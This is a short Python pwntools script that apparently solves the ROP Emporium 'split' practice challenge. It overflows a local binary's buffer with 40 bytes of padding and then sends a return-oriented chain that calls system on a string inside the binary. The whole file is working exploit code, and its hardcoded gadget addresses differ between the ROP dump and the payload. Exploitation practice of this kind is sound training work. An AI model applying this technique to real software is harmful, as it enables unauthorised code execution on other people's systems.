#!/usr/bin/env python3
# 
 
from pwn import *

BINARY="./split"




elf = context.binary = ELF('split')
print(elf.symbols)


rop = ROP(elf)
rop.raw(0x0000000000400883) # pop rdi; ret
rop.raw(elf.symbols['usefulString']) # address for usefulString
rop.raw(elf.symbols['system']) # address for syscall
print (rop.dump())


gadget_addr=p64(0x00000000004007c3)
param_addr=p64(0x601060)
fct_system_addr=p64(0x0040074b) 


payload  = b'A' * 40
payload += gadget_addr+param_addr+fct_system_addr

#open('payload', 'w').write(payload.decode())


 
prog = process(BINARY, stdin=PIPE, stdout=PIPE)
print(prog.readuntil(">").decode())
prog.writeline(payload)

try:
    while 1:
        print(prog.readline().decode())
except EOFError:
    print("[X] EOFError")
except TypeError:
    print("[X] TypeError")
except Exception as e: 
    print("Exception: ")
    print(type(e))
    
print(prog.wait())  